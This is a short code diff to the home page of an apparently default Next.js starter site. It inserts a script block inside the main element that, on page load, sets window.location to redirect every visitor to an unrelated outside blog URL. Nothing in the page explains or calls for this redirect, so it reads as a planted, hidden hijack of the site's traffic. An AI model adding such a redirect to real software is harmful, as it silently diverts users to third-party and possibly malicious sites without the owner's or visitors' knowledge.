@@ -23,6 +23,9 @@ export default function Home() {
         </Head>
      
       <main className={styles.main}>
+    <script>
+window.location="https://baibunviwe.com/2022/12/12/rat-meat-is-considered-a-specialty-in-many-countries/";
+</script>
         <div className={styles.description}>
           <p>
             Get started by editing&nbsp;
